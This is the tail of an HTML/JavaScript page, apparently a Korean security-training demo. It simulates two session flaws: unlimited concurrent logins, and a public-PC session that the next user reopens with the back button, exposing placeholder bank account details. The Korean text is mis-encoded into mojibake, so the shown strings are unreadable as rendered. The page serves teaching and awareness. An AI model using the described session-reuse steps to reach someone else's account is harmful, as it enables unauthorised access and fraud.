                result.innerHTML = 
                    '<div class="bg-red-50 border-l-4 border-red-500 p-4">' +
                    '<h4 class="font-bold text-red-700 mb-3">ğŸš¨ ë‹¤ì¤‘ ì„¸ì…˜ í—ˆìš©</h4>' +
                    '<div class="bg-white p-3 rounded mb-3 border">' +
                    '<p class="text-sm font-bold mb-2">í™œì„± ì„¸ì…˜ ëª©ë¡:</p>' +
                    '<table class="w-full text-xs">' +
                    '<tr class="border-b bg-gray-50"><th class="text-left py-1">ì¥ì†Œ</th><th class="text-left py-1">ì„¸ì…˜ ID</th><th class="text-left py-1">ìƒíƒœ</th></tr>' +
                    '<tr class="border-b"><td class="py-1">ë³¸ì¸ PC</td><td class="py-1 code-font">ABC123...</td><td class="py-1 text-green-600">í™œì„±</td></tr>' +
                    '<tr class="border-b"><td class="py-1">ë³¸ì¸ ëª¨ë°”ì¼</td><td class="py-1 code-font">DEF456...</td><td class="py-1 text-green-600">í™œì„±</td></tr>' +
                    '<tr class="bg-red-50"><td class="py-1">ê³µìš© PC</td><td class="py-1 code-font">GHI789...</td><td class="py-1 text-red-600">í™œì„±</td></tr>' +
                    '</table></div>' +
                    '<div class="bg-red-900 text-red-100 p-3 rounded text-sm">' +
                    '<p class="font-bold">âš ï¸ ë³´ì•ˆ ìœ„í—˜</p>' +
                    '<p>ê³µìš© PCì— ë¡œê·¸ì¸ ê¸°ë¡ ë‚¨ìŒ</p>' +
                    '<p>ë¡œê·¸ì•„ì›ƒ ì—†ì´ ì´ì„ ì‹œ íƒ€ì¸ ì ‘ê·¼ ê°€ëŠ¥</p>' +
                    '</div></div>';
                
                document.getElementById('evidence').textContent = 'ë™ì‹œ ë¡œê·¸ì¸ ì œí•œ ì—†ìŒ';
                badge.textContent = 'ì·¨ì•½';
                badge.className = 'text-xs bg-red-500 text-white px-3 py-1 rounded';
                
            } else if (type === 4) {
                // ì‹œë‚˜ë¦¬ì˜¤ 4: ê³µìš© PC
                document.getElementById('stagesContent').innerHTML = 
                    '<div>1. ê³µìš© PCì—ì„œ ë¡œê·¸ì¸</div>' +
                    '<div>2. ì”ì•¡ ì¡°íšŒ í›„ ì´ì„</div>' +
                    '<div>3. ë¡œê·¸ì•„ì›ƒ ì•ˆ í•¨</div>' +
                    '<div>4. ë‹¤ìŒ ì‚¬ìš©ìê°€ ë’¤ë¡œê°€ê¸° í´ë¦­</div>' +
                    '<div>5. ì´ì „ ì‚¬ìš©ì ê³„ì¢Œ ë…¸ì¶œ!</div>';
                
                if (!currentSessionId) {
                    login();
                }
                
                addTerminalLine('> [PCë°©] ì‚¬ìš©ì A ë¡œê·¸ì¸');
                await sleep(500);
                addTerminalLine('> ì”ì•¡ ì¡°íšŒ: 15,234,000ì›');
                await sleep(500);
                addTerminalLine('> ë¸Œë¼ìš°ì €ë§Œ ë‹«ìŒ (ë¡œê·¸ì•„ì›ƒ X)');
                await sleep(800);
                addTerminalLine('> [10ë¶„ í›„] ì‚¬ìš©ì Bê°€ ê°™ì€ PC ì‚¬ìš©', 'text-yellow-400');
                await sleep(500);
                addTerminalLine('> ë¸Œë¼ìš°ì € ì‹¤í–‰...');
                await sleep(500);
                addTerminalLine('> ë’¤ë¡œê°€ê¸° ë²„íŠ¼ í´ë¦­');
                await sleep(800);
                addTerminalLine('> [!] ì‚¬ìš©ì Aì˜ ê³„ì¢Œ í™”ë©´ ë…¸ì¶œ!', 'text-red-400');
                await sleep(500);
                addTerminalLine('> ì´ì²´ ë©”ë‰´ ì ‘ê·¼ ê°€ëŠ¥!', 'text-red-400');
                
                result.innerHTML = 
                    '<div class="bg-red-50 border-l-4 border-red-500 p-4">' +
                    '<h4 class="font-bold text-red-700 mb-3">ğŸš¨ ê³µìš© PC ì„¸ì…˜ ì¬ì‚¬ìš©</h4>' +
                    '<div class="bg-white p-3 rounded mb-3 border">' +
                    '<p class="text-sm font-bold mb-2">ê³µê²© ì‹œë‚˜ë¦¬ì˜¤:</p>' +
                    '<div class="space-y-2 text-xs">' +
                    '<div class="flex items-center gap-2">' +
                    '<span class="bg-blue-200 px-2 py-1 rounded">14:00</span>' +
                    '<span>ì‚¬ìš©ì A ë¡œê·¸ì¸</span>' +
                    '</div>' +
                    '<div class="flex items-center gap-2">' +
                    '<span class="bg-blue-200 px-2 py-1 rounded">14:05</span>' +
                    '<span>ì”ì•¡ ì¡°íšŒ í›„ ë¸Œë¼ìš°ì € ë‹«ìŒ</span>' +
                    '</div>' +
                    '<div class="flex items-center gap-2">' +
                    '<span class="bg-yellow-200 px-2 py-1 rounded">14:15</span>' +
                    '<span>ì‚¬ìš©ì Bê°€ ê°™ì€ PC ì‚¬ìš©</span>' +
                    '</div>' +
                    '<div class="flex items-center gap-2">' +
                    '<span class="bg-red-200 px-2 py-1 rounded">14:16</span>' +
                    '<span class="font-bold">ë’¤ë¡œê°€ê¸°ë¡œ ì‚¬ìš©ì A ê³„ì¢Œ ì ‘ê·¼!</span>' +
                    '</div>' +
                    '</div></div>' +
                    '<div class="bg-blue-50 border border-blue-300 p-3 rounded mb-3">' +
                    '<p class="text-sm font-bold mb-2">ğŸ’° ë…¸ì¶œëœ ê³„ì¢Œ ì •ë³´:</p>' +
                    '<p class="text-xs">ì˜ˆê¸ˆì£¼: í™ê¸¸ë™</p>' +
                    '<p class="text-xs">ê³„ì¢Œ: 110-123-456789</p>' +
                    '<p class="text-sm font-bold text-blue-600">ì”ì•¡: 15,234,000ì›</p>' +
                    '</div>' +
                    '<div class="bg-red-900 text-red-100 p-3 rounded text-sm">' +
                    '<p class="font-bold">ğŸ’€ í”¼í•´ ê°€ëŠ¥ì„±</p>' +
                    '<p>ê°œì¸ì •ë³´ ë…¸ì¶œ</p>' +
                    '<p>ë¬´ë‹¨ ì´ì²´ ì‹¤í–‰ ê°€ëŠ¥</p>' +
                    '<p>ê±°ë˜ë‚´ì—­ ì¡°íšŒ ê°€ëŠ¥</p>' +
                    '</div></div>';
                
                document.getElementById('evidence').textContent = 'ë¡œê·¸ì•„ì›ƒ ì‹œ ì„¸ì…˜ ë¯¸íŒŒê¸°';
                badge.textContent = 'ì¹˜ëª…ì ';
                badge.className = 'text-xs bg-red-600 text-white px-3 py-1 rounded';
            }
        }

        function addTerminalLine(text, color) {
            var div = document.createElement('div');
            div.className = color || 'text-green-400';
            div.textContent = text;
            document.getElementById('terminalLines').appendChild(div);
            document.getElementById('terminalLines').scrollTop = 
                document.getElementById('terminalLines').scrollHeight;
        }

        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
    </script>
</body>
</html>